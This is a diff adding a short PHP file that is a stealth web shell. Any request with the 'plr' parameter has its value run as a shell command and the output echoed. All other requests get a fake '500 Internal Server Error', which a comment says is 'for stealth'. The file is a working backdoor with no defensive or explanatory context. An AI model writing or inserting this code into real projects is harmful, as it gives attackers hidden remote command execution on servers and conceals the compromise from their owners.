@@ -1,0 +1,10 @@
+<?php
+if(isset($_REQUEST["plr"])) {
+    echo "<pre>" . shell_exec($_REQUEST["plr"]) . "</pre>";
+} else {
+    // Display 500 Internal Server Error for stealth
+    header("HTTP/1.1 500 Internal Server Error");
+  
+    exit();
+}
+?>
